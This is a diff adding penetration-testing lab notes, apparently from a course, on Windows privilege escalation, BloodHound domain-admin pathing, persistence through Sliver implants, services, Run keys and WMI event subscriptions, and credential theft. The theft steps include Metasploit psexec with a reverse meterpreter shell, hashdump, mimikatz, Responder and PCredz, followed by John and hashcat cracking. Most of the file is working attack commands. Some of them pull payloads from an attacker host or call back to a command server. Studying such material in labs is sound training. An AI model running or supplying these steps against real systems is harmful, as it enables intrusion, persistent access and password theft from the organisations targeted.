@@ -1,0 +1,340 @@
+{{{ Section: 3.1 - Win Privesc ================================================================
+\\LAB
+// BeRoot
+beRoot.exe
+
+// PowerUp
+powershell
+cd C:\Tools
+Import-Module .\PowerUp.ps1
+R
+
+Invoke-AllChecks 
+
+// ServiceConfig - view the USP 
+services.msc
+
+// exploit vuln w/PowerUp
+        \\ includes AbuseFunction - easy copy-paste syntaxt to exploit identified issues
+Write-ServiceBinary -ServiceName 'Video Stream' -Path <HijackPath>
+Write-ServiceBinary -ServiceName 'Video Stream' -Path 'C:\Program Files\VideoStream\1337.exe'
+- by default, PowerUp creates 1337.exe : add admin john/ Password123!
+
+===================================================================}}}
+
+{{{ Section: 3.2 AD attacks -- Bloodhound ================================================================
+AD enum: 
+->Sharphound / ADexplorerSnapshot.py 
+--> Bloodhound ingest 
+---> path 2 domain 
+        path choices: choose real human path vs service accnt path?
+        what looks more normal
+
+ADexplorerSnapshot.py - ingestor for BloodHound 
+- uses sysinternal for enum
+
+
+\\ LAB - BLOODHOUND 
+- install BloodHound / neo4j database service 
+- launch BloodHound
+
+- search up owned user 
+- right click 'Mark user as Owned'
+
+- Right click Queries 
+- Short path to dom admins FROM OWNED PRINCIPALS -> domainadmins@tokyo.japan.local
+
+// another Pathfind - find a Path to endpoint 
+- click Highway icon (Pathfinding) - specify endpoint to navigate to 
+- enter in Target Node: DOMAIN ADMINS@TOKYO.JAPAN.LOCAL
+- hit Play > 
+        - right click bg, Change Layout = cleaner 
+
+
+// Pre-built queries 
+- Queries -> Find shortest path to dom admin 
+        - doesn't take 'start point' into account, just finds shortest path from a non-domain admin to a domain admin 
+
+
+
+===================================================================}}}
+
+{{{ Section: Persistence ================================================================
+
+// setup server
+sudo sliver-server
+https 
+generate -h // there is a service format 
+
+// gen an exe and service 
+generate --os windows --arch 64bit --skip-symbols --format service --name service --http https://10.10.10.128
+generate --os windows --arch 64bit --skip-symbols --format exe --name payload --http https://10.10.10.128
+
+ls -l *.exe
+sudo chown sec560:sec560 *.exe
+
+\\ switch to win 
+cd Desktop 
+wget http://LINUX_ETH0_ADDRESS:8000/payload.exe -OutFile payload.exe
+wget http://LINUX_ETH0_ADDRESS:8000/service.exe -OutFile service.exe
+
+// create 'persistent' service 
+sc create persist binpath= "c:\Users\sec560\Desktop\service.exe" start= auto
+reboot 
+
+sliver > sessions -i <first2>
+whoami 
+
+sc stop persist 
+sc delete persist 
+
+// add reg key 
+reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /t REG_SZ /F /D "C:\Users\sec560\Desktop\payload.exe"
+
+sessions -i <>
+
+reg delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "User Persist" /F 
+
+
+// WMI Event Filter Persistence!!!!
+- listener for failed user login 
+
+$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{EventNamespace = 'root/cimv2'; Name = "UPDATER"; Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND Targetinstance.EventCode = '4625' And Targetinstance.Message Like '%fakeuser%'"; QueryLanguage = 'WQL'}
+
+$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name = "UPDATER"; CommandLineTemplate = "C:\Users\sec560\Desktop\payload.exe"}
+
+$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter = $Filter; Consumer = $Consumer}
+
+
+\\ attempt login on nix
+smbclient '\\WINDOWS_ETHERNET0_ADDRESS\c$' -U fakeuser fakepass
+
+// remove 
+
+Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Updater%'" | Remove-WmiObject -Verbose
+
+Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "__Path LIKE '%UPDATER%'" | Remove-WmiObject -Verbose
+
+Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "__Path LIKE '%UPDATER%'" | Remove-WmiObject -Verbose
+
+===================================================================}}}
+
+{{{ Section: Passwds & Cred access ================================================================
+
+\\ Create custom dict for tgt enviro
+1. crawl website
+2. tailor word guess to policy
+	i. repeats just waste time - NO DUPLICATE 
+	ii. remove password passwds that don't meet passwd policy (legnth/cmoplexity)
+3. pw-inspector -m 8 -c 3 -unps -I wordlist.txt | sort -u > dictionary.txt 
+	i. sort -u wordlists.txt | spong wordlist.txt
+		1) sponge = soak up stdin and writes to specified file 
+
+
+// push random data against hashing algo
+dd if=/dev/urandom bs=1M count=1 | sha1sum
+
+// how nix salting works
+echo passwd | mkpasswd --method=md5 --salt=00000000 | md5sum
+
+\\ LAB
+// exploit setup
+use exploit/windows/smb/psexec
+set PAYLOAD windows/meterpreter/reverse_tcp
+set RHOSTS 10.130.10.5
+set LHOST tun0
+
+set SMBUser bgreen
+set SMBDomain hiboxy
+set SMBPass Password1
+run
+
+// smart hashdump vs hashdump
+- smart and will dump password hashes differently depending on the target system's role. If the target is a domain controller, it will pull passwords differently and from a dfferent location
+
+run post/windows/gather/smart_hashdump
+        \\ if 2nd half of hash = same (31d6cxxx) -> NULL hash. hashdump won't work 
+        \\ but WILL work on domain controller 
+
+run post/windows/gather/hashdump
+        \\ save hashes for cracking or PASS THE HASH
+
+// switch to sploit SMB on my wind for lab
+set LHOST eth0
+set SMBUSER sec560
+set SMBPASS sec560
+unset SMBDomain
+set RHOSTS WINDOWS_ETHERNET0_ADDRESS
+
+// migrate to x64 (spoolsv.exe!)
+ps -A x64 -s
+migrate -N spoolsv.exe
+
+// now can load mimikatz 
+load kiwi
+creds_all // get passwds from RAM - logged in user 
+
+\\ END LAB 
+
+===================================================================}}}
+
+{{{ Section: John/ Hashcat  ================================================================
+// show cracked hashes
+john md5crypt-hash --show
+
+\\ LAB
+// john 
+john --test --format=lm // benchmark ur speed 
+Benchmarking: LM [DES 256/256 AVX2]... (2xOMP) DONE
+Raw:	102612K c/s real, 54292K c/s virtual
+
+john --test --format=md5crypt
+Many salts:	183168 c/s real, 97429 c/s virtual
+Only one salt:	172032 c/s real, 91995 c/s virtual
+
+// basic LM crack 
+john ~/labs/web01.hashes
+- john autodetected LM \\ RARE on modern systems, EXCEPT regular on domains with old accounts; 15% of environments 
+- john cracks first half then 2nd half // need to combine the 2
+
+john ~/labs/web01.hashes --show
+cat ~/.john/john.pot // or can just show pot 
+
+// john NT crack
+john --format=nt ~/labs/web01.hashes
+        \\ the NT format does not convert the password nor does it split the password. This means that the password is harder to crack.
+        \\ We can use this uppercase password with the NT password to recover the original passwor
+
+grep vberry ~/labs/web01.hashes // first hash is LM, 2nd is NT
+      // can use uppercase passwd against NT hash to get the case passwd
+
+john --format=nt --loopback ~/labs/web01.hashes // uses pot file as input for cracker 
+
+--- got LM hash, cracked it, then used the case insensitive hash to crack the case sensitive NT hash
+--- ty LM storage mechnism 
+
+// john & wordlist 
+john --format=nt --wordlist=/opt/passwords/rockyou.txt ~/labs/web01.hashes
+john ~/labs/web10.shadow --wordlist=/opt/passwords/rockyou.txt
+        sha512crypt takes much longer 
+
+
+// hashcat 
+hashcat --help | less
+
+    0: Straight. This mode uses the dictionary words as they appear in their dictionary, with rules applied to them as specified by the -r option (if present). Examples: letmein and password
+
+    1: Combination. This mode will take each word in the dictionary and append it to each word in the dictionary, essentially squaring the number of potential passwords from a word file. It will also apply the rules indicated by the -r option (if present) to the resulting combined words. Examples: letmeinpassword and passwordletmein
+
+    3: Brute Force. This mode tries all potential passwords in a given keyspace, iterating through all characters. Examples: 0000, 0001, 0002, etc.
+
+    6: Hybrid + Mask. This mode uses a dictionary but then appends a brute force component. Examples: letmein0000, password0000, letmein0001, etc.
+
+hashcat --help | grep LM
+hashcat --help | grep md5crypt
+
+-w 3 = workload profile // use as much computing power while perserving some GUI access... 
+
+// benchmark LM
+hashcat -w 3 --benchmark -m 3000
+Speed.#2.........: 60907.4 kH/s (7.97ms) @ Accel:256 Loops:1024 Thr:1 Vec:8
+
+// benchmark salted MD5 (md5crypt)
+hashcat -w 3 --benchmark -m 500
+Speed.#2.........:    10258 H/s (49.12ms) @ Accel:256 Loops:1000 Thr:1 Vec:8
+
+// benchmark sha512crypt 
+hashcat -w 3 --benchmark -m 1800
+Speed.#2.........:      716 H/s (70.77ms) @ Accel:256 Loops:1024 Thr:1 Vec:4
+
+
+// crack NT hashes 
+hashcat -w 3 -a 0 -m 1000 ~/labs/web01.hashes /opt/passwords/rockyou.txt
+
+// view rules 
+ls /usr/local/share/doc/hashcat/rules/
+head -n 30 /usr/local/share/doc/hashcat/rules/best64.rule 
+- each word attempted, reverse, all uppercase of first level is toggled, each word tken and a single digit applied to end 0-9
+- then each word with digit repeated twice, ignoring white space 
+
+// hashcat w/ rule
+hashcat -w 3 -a 0 -m 1000 ~/labs/web01.hashes /opt/passwords/rockyou.txt -r /usr/local/share/doc/hashcat/rules/best64.rule
+
+// view 
+hashcat -m 1000 --username --show --outfile-format 2 ~/labs/web01.hashes
+
+
+\\ hashcat & masking 
+- if we want to append all possible 2 digit numbers, can use: ?d?d 
+
+hashcat -w 3 -a 6 -m 1000 ~/labs/web01.hashes /opt/passwords/english-dictionary-capitalized.txt ?d?d
+- unlike above rule, this mask uses all 2 digit numbesr
+
+// common mask 
+- ppl often pick a word, add a number, then a special char 
+hashcat -w 3 -a 6 -m 1000 ~/labs/web01.hashes /opt/passwords/english-dictionary-capitalized.txt ?d?s
+
+// save passwds cracked to another file , dont need usernames  
+hashcat -m 1000 --show --outfile-format 2 ~/labs/web01.hashes | tee /tmp/passwords.txt
+
+// CRACK LINUX PASSWDS
+hashcat -w 3 -a 0 -m 1800 ~/labs/web10.shadow /tmp/passwords.txt -r /usr/local/share/doc/hashcat/rules/best64.rule
+
+// view results 
+hashcat -m 1800 --username --show --outfile-format 2 ~/labs/web10.shadow
+
+// view ALL hashes/ cracked passwds
+cat ~/.local/share/hashcat/hashcat.potfile
+
+
+===================================================================}}}
+
+{{{ Section: Responder <- linux/petest version of Inveigh  ================================================================
+
+// run in environment 
+sudo /opt/responder/Responder.py -I eth0/ 
+
+\\ on windows explorer,open SMB session
+
+\\WINDOWS01
+
+
+// crack w/JOHN
+john --format=netntlmv2 /opt/responder/logs/SMB-NTLMv2-SSP-*
+- responder hashes default loc 
+
+// to review
+john --show /opt/responder/logs/SMB-NTLMv2-SSP-*.txt
+
+
+
+//  METHOD 2 - capturing hashes with sniffer 
+Scenarios
+    An attacker has a man-in-the-middle position and captures authentication
+    An attacker runs a service and waits for a vulnerability scanner to connect to the service
+    An attacker is allowed to get a user to try to mount a share on an attacker-controlled machine
+
+sudo tcpdump -nv -w /tmp/winauth.pcap port 445
+
+\\ SMB client attempt 
+smbclient //YOUR_WINDOWS_IP_ADDRESS/c$ -U clark Qwerty12
+
+
+// extract pcap hashes w/ PCredz 
+- also does credit card, NTLM(dce-rpc,httpsql,ldap),kerberos, httpbasic, SNMP, pop/smpt/ftp/imap
+
+
+sudo Pcredz -vf /tmp/winauth.pcap
+
+// can also view hashes here
+ls /opt/pcredz/logs/
+cat /opt/pcredz/logs/NTLMv2.txt
+
+//crack 
+john /opt/pcredz/logs/NTLMv2.txt
+
+hashcat -w 3 -a 0 -m 5600 /opt/pcredz/logs/NTLMv2.txt /opt/passwords/rockyou.txt
+hashcat -m 5600 --show --outfile-format 2 /opt/pcredz/logs/NTLMv2.txt
+
+===================================================================}}}
+
